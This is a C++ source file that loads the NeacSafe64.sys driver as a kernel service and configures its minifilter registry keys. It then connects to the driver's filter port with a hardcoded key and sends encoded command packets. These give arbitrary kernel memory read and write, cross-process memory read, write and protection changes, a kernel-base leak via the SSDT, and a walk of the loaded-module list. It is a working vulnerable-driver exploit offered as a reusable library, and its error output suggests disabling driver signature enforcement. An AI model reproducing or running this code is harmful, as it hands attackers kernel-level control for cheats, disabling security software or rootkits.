#include "NeacInterface.hpp"
#include <fltUser.h>
#include <emmintrin.h>
#include <string>

#pragma comment(lib, "fltLib.lib")

#pragma pack(push, 1)
struct NEAC_FILTER_CONNECT {
    DWORD Magic;
    DWORD Version;
    BYTE EncKey[32];
};

struct KERNEL_READ_PACKET {
    BYTE Opcode;
    PVOID Src;
    DWORD Size;
};

struct KERNEL_WRITE_PACKET {
    BYTE Opcode;
    PVOID Dst;
    PVOID Src;
    DWORD Size;
};

struct PROTECT_MEMORY_PACKET {
    BYTE Opcode;
    DWORD Pid;
    PVOID Addr;
    DWORD Size;
    DWORD NewProtect;
};

struct GET_PROC_BASE_PACKET {
    BYTE Opcode;
    DWORD Pid;
};

struct READ_MEMORY_PACKET {
    BYTE Opcode;
    DWORD Pid;
    PVOID Addr;
    DWORD Size;
};

struct WRITE_MEMORY_PACKET {
    BYTE Opcode;
    DWORD Pid;
    PVOID Addr;
    DWORD Size;
};

struct GET_SSDT_PACKET {
    BYTE Opcode;
};
#pragma pack(pop)

static BYTE g_Key[33] = "FuckKeenFuckKeenFuckKeenFuckKeen";
static unsigned char g_EncImm[] = {
    0x7A, 0x54, 0xE5, 0x41, 0x8B, 0xDB, 0xB0, 0x55, 
    0x7A, 0xBD, 0x01, 0xBD, 0x1A, 0x7F, 0x9E, 0x17
};

static void Encrypt(unsigned int* buffer, unsigned int idx) {
    __m128i imm = _mm_load_si128((__m128i*)g_EncImm);
    __m128i zero;
    memset(&zero, 0, sizeof(__m128i));
    
    __m128i v2 = _mm_cvtsi32_si128(idx);
    __m128i v8 = _mm_xor_si128(
        _mm_shuffle_epi32(_mm_shufflelo_epi16(_mm_unpacklo_epi8(v2, v2), 0), 0),
        imm);
    
    unsigned int* result = &v8.m128i_u32[3];
    __m128i v5 = _mm_cvtsi32_si128(0x4070E1Fu);
    
    for (int i = 0; i < 4; i++) {
        __m128i v6 = _mm_shufflelo_epi16(
            _mm_unpacklo_epi8(_mm_or_si128(_mm_cvtsi32_si128(*result), v5), zero), 27);
        v6 = _mm_packus_epi16(v6, v6);
        *buffer = (*buffer ^ ~idx) ^ v6.m128i_u32[0] ^ idx;
        ++buffer;
        result = (unsigned int*)((char*)result - 1);
    }
}

static void EncodePayload(PBYTE key, PBYTE buffer, SIZE_T size) {
    for (size_t i = 0; i < size; i++) {
        buffer[i] ^= key[i & 31];
    }
    unsigned int* ptr = (unsigned int*)buffer;
    unsigned int v12 = 0;
    do {
        Encrypt(ptr, v12++);
        ptr += 4;
    } while (v12 < size >> 4);
}

NeacInterface::NeacInterface() 
    : m_hPort(INVALID_HANDLE_VALUE)
    , m_KernelBase(nullptr)
    , m_PsLoadedModuleList(nullptr) {
    memset(m_SsdtItems, 0, sizeof(m_SsdtItems));
}

NeacInterface::~NeacInterface() {
    Shutdown();
}

static std::wstring GetDriverPath() {
    wchar_t exePath[MAX_PATH] = {0};
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    
    std::wstring path(exePath);
    size_t lastSlash = path.find_last_of(L"\\/");
    if (lastSlash != std::wstring::npos) {
        path = path.substr(0, lastSlash + 1);
    }
    path += L"NeacSafe64.sys";
    
    if (GetFileAttributesW(path.c_str()) != INVALID_FILE_ATTRIBUTES) {
        return path;
    }
    
    GetCurrentDirectoryW(MAX_PATH, exePath);
    path = std::wstring(exePath) + L"\\NeacSafe64.sys";
    if (GetFileAttributesW(path.c_str()) != INVALID_FILE_ATTRIBUTES) {
        return path;
    }
    
    path = std::wstring(exePath) + L"\\..\\..\\..\\..\\NeacSafe64.sys";
    wchar_t fullPath[MAX_PATH];
    if (GetFullPathNameW(path.c_str(), MAX_PATH, fullPath, NULL)) {
        if (GetFileAttributesW(fullPath) != INVALID_FILE_ATTRIBUTES) {
            return fullPath;
        }
    }
    
    return L"";
}

static bool ConfigureMinifilterRegistry() {
    HKEY hServiceKey = NULL;
    HKEY hInstancesKey = NULL;
    HKEY hInstanceKey = NULL;
    LONG result;
    bool success = false;

    const wchar_t* servicePath = L"SYSTEM\\CurrentControlSet\\Services\\NeacSafe64";
    const wchar_t* instanceName = L"NeacSafe64 Instance";
    const wchar_t* altitude = L"370020";
    const wchar_t* loadOrderGroup = L"FSFilter Activity Monitor";
    const wchar_t* dependOnService = L"FltMgr\0";
    DWORD serviceType = 2;  // SERVICE_FILE_SYSTEM_DRIVER
    DWORD flags = 0;
    DWORD supportedFeatures = 3;

    result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, servicePath, 0, KEY_ALL_ACCESS, &hServiceKey);
    if (result != ERROR_SUCCESS) {
        printf("[!] Failed to open service registry key (Error: %d)\n", result);
        return false;
    }

    // Set Type to FILE_SYSTEM_DRIVER
    RegSetValueExW(hServiceKey, L"Type", 0, REG_DWORD, (BYTE*)&serviceType, sizeof(DWORD));
    
    // Set LoadOrderGroup
    RegSetValueExW(hServiceKey, L"LoadOrderGroup", 0, REG_SZ, 
        (BYTE*)loadOrderGroup, (DWORD)(wcslen(loadOrderGroup) + 1) * sizeof(wchar_t));
    
    // Set DependOnService (MULTI_SZ format)
    RegSetValueExW(hServiceKey, L"DependOnService", 0, REG_MULTI_SZ,
        (BYTE*)dependOnService, (DWORD)(wcslen(dependOnService) + 2) * sizeof(wchar_t));

    // Set SupportedFeatures
    RegSetValueExW(hServiceKey, L"SupportedFeatures", 0, REG_DWORD, 
        (BYTE*)&supportedFeatures, sizeof(DWORD));

    // Create Instances subkey
    result = RegCreateKeyExW(hServiceKey, L"Instances", 0, NULL, 
        REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hInstancesKey, NULL);
    if (result != ERROR_SUCCESS) {
        printf("[!] Failed to create Instances key (Error: %d)\n", result);
        goto cleanup;
    }

    // Set DefaultInstance
    RegSetValueExW(hInstancesKey, L"DefaultInstance", 0, REG_SZ,
        (BYTE*)instanceName, (DWORD)(wcslen(instanceName) + 1) * sizeof(wchar_t));

    // Create instance subkey
    result = RegCreateKeyExW(hInstancesKey, instanceName, 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hInstanceKey, NULL);
    if (result != ERROR_SUCCESS) {
        printf("[!] Failed to create instance key (Error: %d)\n", result);
        goto cleanup;
    }

    // Set Altitude
    RegSetValueExW(hInstanceKey, L"Altitude", 0, REG_SZ,
        (BYTE*)altitude, (DWORD)(wcslen(altitude) + 1) * sizeof(wchar_t));

    // Set Flags
    RegSetValueExW(hInstanceKey, L"Flags", 0, REG_DWORD, (BYTE*)&flags, sizeof(DWORD));

    printf("[+] Minifilter registry configured\n");
    success = true;

cleanup:
    if (hInstanceKey) RegCloseKey(hInstanceKey);
    if (hInstancesKey) RegCloseKey(hInstancesKey);
    if (hServiceKey) RegCloseKey(hServiceKey);
    return success;
}

bool NeacInterface::Initialize() {
    const wchar_t* SERVICE_NAME = L"NeacSafe64";
    
    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm) {
        printf("[!] OpenSCManager failed (Error: %d)\n", GetLastError());
        printf("[!] Run as Administrator!\n");
        return false;
    }

    SC_HANDLE service = OpenServiceW(scm, SERVICE_NAME, 
        SERVICE_ALL_ACCESS);
    
    if (!service) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_DOES_NOT_EXIST) {
            printf("[*] Service doesn't exist, creating it...\n");
            
            std::wstring driverPath = GetDriverPath();
            if (driverPath.empty()) {
                printf("[!] NeacSafe64.sys not found!\n");
                printf("[!] Place it next to the loader or in current directory\n");
                CloseServiceHandle(scm);
                return false;
            }
            wprintf(L"[+] Found driver: %s\n", driverPath.c_str());
            
            service = CreateServiceW(
                scm,
                SERVICE_NAME,
                L"NeacSafe64 Driver",
                SERVICE_ALL_ACCESS,
                SERVICE_KERNEL_DRIVER,
                SERVICE_DEMAND_START,
                SERVICE_ERROR_NORMAL,
                driverPath.c_str(),
                NULL, NULL, NULL, NULL, NULL
            );
            
            if (!service) {
                printf("[!] CreateService failed (Error: %d)\n", GetLastError());
                CloseServiceHandle(scm);
                return false;
            }
            printf("[+] Service created\n");
            
            // Configure minifilter registry entries
            if (!ConfigureMinifilterRegistry()) {
                printf("[!] Failed to configure minifilter registry\n");
                CloseServiceHandle(service);
                CloseServiceHandle(scm);
                return false;
            }
        } else {
            printf("[!] OpenService failed (Error: %d)\n", err);
            CloseServiceHandle(scm);
            return false;
        }
    }

    SERVICE_STATUS_PROCESS status;
    DWORD bytesNeeded;
    QueryServiceStatusEx(service, SC_STATUS_PROCESS_INFO, (LPBYTE)&status, 
        sizeof(status), &bytesNeeded);
    
    if (status.dwCurrentState != SERVICE_RUNNING) {
        printf("[*] Starting driver...\n");
        if (!StartService(service, 0, NULL)) {
            DWORD err = GetLastError();
            if (err != ERROR_SERVICE_ALREADY_RUNNING) {
                printf("[!] StartService failed (Error: %d)\n", err);
                if (err == 577) {
                    printf("[!] Driver signature enforcement blocked loading\n");
                    printf("[!] Options:\n");
                    printf("[!]   1. Enable test signing: bcdedit /set testsigning on\n");
                    printf("[!]   2. Disable DSE temporarily (advanced)\n");
                    printf("[!]   3. Sign the driver with a valid certificate\n");
                }
                CloseServiceHandle(service);
                CloseServiceHandle(scm);
                return false;
            }
        }
        printf("[+] Driver started\n");
    } else {
        printf("[+] Driver already running\n");
    }
    
    CloseServiceHandle(service);
    CloseServiceHandle(scm);

    // Connect to filter port
    NEAC_FILTER_CONNECT lpContext;
    lpContext.Magic = 0x4655434B;
    lpContext.Version = 8;
    memcpy(lpContext.EncKey, g_Key, 32);

    HRESULT hr = FilterConnectCommunicationPort(
        L"\\OWNeacSafePort",
        FLT_PORT_FLAG_SYNC_HANDLE,
        &lpContext,
        40,
        NULL,
        &m_hPort);

    if (FAILED(hr) || m_hPort == INVALID_HANDLE_VALUE) {
        printf("[!] FilterConnectCommunicationPort failed (0x%X)\n", hr);
        return false;
    }
    printf("[+] Connected to NeacSafe64 filter port\n");

    // Get SSDT items
    const int buffersize = 16;
    BYTE buffer[buffersize] = {0};
    GET_SSDT_PACKET* ptr = (GET_SSDT_PACKET*)buffer;
    ptr->Opcode = 12;
    EncodePayload(g_Key, buffer, buffersize);

    DWORD outSize;
    hr = FilterSendMessage(m_hPort, buffer, buffersize, m_SsdtItems, sizeof(m_SsdtItems), &outSize);
    if (FAILED(hr)) {
        printf("[!] Failed to get SSDT items\n");
        return false;
    }

    // Calculate kernel base
    DWORD rva = GetExportRva("NtWaitForSingleObject");
    if (rva == 0 || m_SsdtItems[4] == 0) {
        printf("[!] Failed to calculate kernel base\n");
        return false;
    }
    m_KernelBase = (void*)((uint8_t*)m_SsdtItems[4] - rva);
    printf("[+] Kernel base: %p\n", m_KernelBase);

    // Get PsLoadedModuleList
    rva = GetExportRva("PsLoadedModuleList");
    if (rva != 0) {
        m_PsLoadedModuleList = (void*)((uint8_t*)m_KernelBase + rva);
        printf("[+] PsLoadedModuleList: %p\n", m_PsLoadedModuleList);
    }

    return true;
}

void NeacInterface::Shutdown() {
    if (m_hPort != INVALID_HANDLE_VALUE) {
        CloseHandle(m_hPort);
        m_hPort = INVALID_HANDLE_VALUE;
    }

    // Stop driver service
    const wchar_t* SERVICE_NAME = L"NeacSafe64";
    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (scm) {
        SC_HANDLE service = OpenService(scm, SERVICE_NAME, SERVICE_STOP | SERVICE_QUERY_STATUS);
        if (service) {
            SERVICE_STATUS stopStatus;
            ControlService(service, SERVICE_CONTROL_STOP, &stopStatus);
            CloseServiceHandle(service);
        }
        CloseServiceHandle(scm);
    }
}

bool NeacInterface::KernelRead(void* dest, void* src, uint32_t size) {
    const int buffersize = ((sizeof(KERNEL_READ_PACKET) / 16) + 1) * 16;
    BYTE buffer[buffersize] = {0};
    KERNEL_READ_PACKET* ptr = (KERNEL_READ_PACKET*)buffer;
    ptr->Opcode = 14;
    ptr->Src = src;
    ptr->Size = size;
    EncodePayload(g_Key, buffer, buffersize);

    DWORD outSize;
    HRESULT hr = FilterSendMessage(m_hPort, buffer, buffersize, dest, size, &outSize);
    return SUCCEEDED(hr);
}

bool NeacInterface::KernelWrite(void* dest, void* src, uint32_t size) {
    const int buffersize = ((sizeof(KERNEL_WRITE_PACKET) / 16) + 1) * 16;
    BYTE buffer[buffersize] = {0};
    KERNEL_WRITE_PACKET* ptr = (KERNEL_WRITE_PACKET*)buffer;
    ptr->Opcode = 70;
    ptr->Dst = dest;
    ptr->Src = src;
    ptr->Size = size;
    EncodePayload(g_Key, buffer, buffersize);

    DWORD outSize;
    HRESULT hr = FilterSendMessage(m_hPort, buffer, buffersize, NULL, 0, &outSize);
    return SUCCEEDED(hr);
}

bool NeacInterface::ProtectMemory(uint32_t pid, void* addr, uint32_t size, uint32_t newProtect) {
    const int buffersize = ((sizeof(PROTECT_MEMORY_PACKET) / 16) + 1) * 16;
    BYTE buffer[buffersize] = {0};
    PROTECT_MEMORY_PACKET* ptr = (PROTECT_MEMORY_PACKET*)buffer;
    ptr->Opcode = 60;
    ptr->Pid = pid;
    ptr->Addr = addr;
    ptr->Size = size;
    ptr->NewProtect = newProtect;
    EncodePayload(g_Key, buffer, buffersize);

    DWORD outSize;
    HRESULT hr = FilterSendMessage(m_hPort, buffer, buffersize, NULL, 0, &outSize);
    return SUCCEEDED(hr);
}

void* NeacInterface::GetProcessBase(uint32_t pid) {
    const int buffersize = ((sizeof(GET_PROC_BASE_PACKET) / 16) + 1) * 16;
    BYTE buffer[buffersize] = {0};
    GET_PROC_BASE_PACKET* ptr = (GET_PROC_BASE_PACKET*)buffer;
    ptr->Opcode = 32;
    ptr->Pid = pid;
    EncodePayload(g_Key, buffer, buffersize);

    BYTE result[16] = {0};
    DWORD outSize;
    HRESULT hr = FilterSendMessage(m_hPort, buffer, buffersize, result, 16, &outSize);
    if (SUCCEEDED(hr)) {
        return *(void**)result;
    }
    return nullptr;
}

bool NeacInterface::ReadProcessMemory(uint32_t pid, void* addr, uint32_t size, void* out) {
    const int buffersize = ((sizeof(READ_MEMORY_PACKET) / 16) + 1) * 16;
    BYTE buffer[buffersize] = {0};
    READ_MEMORY_PACKET* ptr = (READ_MEMORY_PACKET*)buffer;
    ptr->Opcode = 9;
    ptr->Pid = pid;
    ptr->Addr = addr;
    ptr->Size = size;
    EncodePayload(g_Key, buffer, buffersize);

    DWORD outSize;
    HRESULT hr = FilterSendMessage(m_hPort, buffer, buffersize, out, size, &outSize);
    return SUCCEEDED(hr);
}

bool NeacInterface::WriteProcessMemory(uint32_t pid, void* addr, uint32_t size, void* in) {
    const int buffersize = ((sizeof(WRITE_MEMORY_PACKET) / 16) + 1) * 16;
    BYTE buffer[buffersize] = {0};
    WRITE_MEMORY_PACKET* ptr = (WRITE_MEMORY_PACKET*)buffer;
    ptr->Opcode = 61;
    ptr->Pid = pid;
    ptr->Addr = addr;
    ptr->Size = size;
    EncodePayload(g_Key, buffer, buffersize);

    DWORD outSize;
    HRESULT hr = FilterSendMessage(m_hPort, buffer, buffersize, in, size, &outSize);
    return SUCCEEDED(hr);
}

void* NeacInterface::GetKernelBase() {
    return m_KernelBase;
}

void* NeacInterface::GetPsLoadedModuleList() {
    return m_PsLoadedModuleList;
}

void* NeacInterface::FindKernelModule(const wchar_t* moduleName) {
    if (!m_PsLoadedModuleList) return nullptr;

    void* ptr;
    KernelRead(&ptr, m_PsLoadedModuleList, 8);
    
    WCHAR nameBuffer[260] = {0};
    while (ptr != m_PsLoadedModuleList) {
        memset(nameBuffer, 0, sizeof(nameBuffer));
        
        void* dllBase;
        KernelRead(&dllBase, (uint8_t*)ptr + 0x30, 8);
        
        USHORT nameSize;
        KernelRead(&nameSize, (uint8_t*)ptr + 0x58, 2);
        
        void* nameAddr;
        KernelRead(&nameAddr, (uint8_t*)ptr + 0x60, 8);
        
        if (nameSize > 0 && nameSize < sizeof(nameBuffer)) {
            KernelRead(nameBuffer, nameAddr, nameSize);
            if (_wcsicmp(nameBuffer, moduleName) == 0) {
                return dllBase;
            }
        }
        
        KernelRead(&ptr, ptr, 8);
    }
    return nullptr;
}

void* NeacInterface::GetKernelExport(const char* funcName) {
    DWORD rva = GetExportRva(funcName);
    if (rva == 0) return nullptr;
    return (void*)((uint8_t*)m_KernelBase + rva);
}

uint32_t NeacInterface::GetExportRva(const char* funcName) {
    char system32Path[MAX_PATH];
    GetSystemDirectoryA(system32Path, MAX_PATH);
    std::string kernelPath = std::string(system32Path) + "\\ntoskrnl.exe";

    HANDLE hFile = CreateFileA(kernelPath.c_str(), GENERIC_READ, FILE_SHARE_READ, 
        NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 0;

    HANDLE hMapping = CreateFileMapping(hFile, NULL, SEC_IMAGE | PAGE_READONLY, 0, 0, NULL);
    if (!hMapping) {
        CloseHandle(hFile);
        return 0;
    }

    const uint8_t* fileBase = (const uint8_t*)MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!fileBase) {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return 0;
    }

    DWORD rva = ParseExportRva(fileBase, funcName);
    
    UnmapViewOfFile(fileBase);
    CloseHandle(hMapping);
    CloseHandle(hFile);
    return rva;
}

uint32_t NeacInterface::ParseExportRva(const uint8_t* moduleBase, const char* funcName) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return 0;

    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(moduleBase + dosHeader->e_lfanew);
    IMAGE_DATA_DIRECTORY exportDirEntry = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDirEntry.VirtualAddress == 0) return 0;

    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)(moduleBase + exportDirEntry.VirtualAddress);
    DWORD* nameRvas = (DWORD*)(moduleBase + exportDir->AddressOfNames);
    WORD* ordinals = (WORD*)(moduleBase + exportDir->AddressOfNameOrdinals);
    DWORD* funcRvas = (DWORD*)(moduleBase + exportDir->AddressOfFunctions);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        const char* name = (const char*)(moduleBase + nameRvas[i]);
        if (_stricmp(name, funcName) == 0) {
            WORD ordinal = ordinals[i];
            return funcRvas[ordinal];
        }
    }
    return 0;
}
